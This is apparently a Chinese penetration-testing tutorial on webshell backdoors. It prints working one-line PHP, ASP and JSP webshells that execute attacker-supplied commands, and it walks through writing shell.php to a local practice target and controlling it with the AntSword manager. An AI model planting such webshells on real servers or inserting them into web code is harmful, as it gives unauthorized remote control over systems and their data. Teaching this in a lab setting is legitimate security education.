# 【渗透测试】webshell后门上传

## webshell

WebShell 是一种以网页脚本形式存在的命令执行环境，通常被攻击者上传到目标 Web 服务器上，**用于远程控制服务器**。它本质上是一个具有执行系统命令、文件操作、数据库访问等功能的恶意脚本文件，常见于 PHP、ASP、JSP、Python、Node.js 等 Web 脚本语言编写。

## 类型

### 根据功能划分

1. 小马：文件体积小，用于文件修改，文件上传
2. 大马：文件体积大，功能齐全，可以提权，操作数据库等
3. 一句话木马（主流）：短小精悍，隐蔽性好，客户端直接管理

### 根据脚本语言划分

php一句话木马：`<?php @eval($_POST['cmd']); ?>`攻击者通过 POST 请求发送 `cmd=phpinfo();`，服务器就会执行该代码。

asp一句话木马：`<% eval request("cmd") %>`

jsp一句话木马：`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`

## 蚁剑配置

蚁剑，冰蝎，菜刀都是常用的webshell上传工具，这里以蚁剑为例进行配置

方法：

1. `https://github.com/AntSwordProject/antsword-loader`先去这个网址下载对应操作系统版本的蚁剑加载器
2. 再使用`git clone https://github.com/AntSwordProject/AntSword.git`这个指令，将蚁剑源码克隆到本地一个文件夹
3. 最后打开蚁剑加载器，选择对应源码的目录即可

这里贴一个配置辅助的网址：`https://www.yuque.com/antswordproject/antsword/srruro`

## webshell连接上传

1. 准备好一句话木马，以php一句话木马为例，`<?php @eval($_POST['cmd']); ?>`（实现效果就是通过post给cmd传参数就能执行一些指令）
2. 向靶机写入webshell（以phpstudy靶场为例），在WWW目录下写入`shell.php`
3. 访问`http://127.0.0.1/shell.php`，若页面空白说明写入成功
4. 在蚁剑中，右键添加数据<img src="C:\Users\34743\AppData\Roaming\Typora\typora-user-images\image-20251027210732509.png" alt="image-20251027210732509" style="zoom:50%;" />
5. 然后就能直接在蚁剑中进行对靶机的控制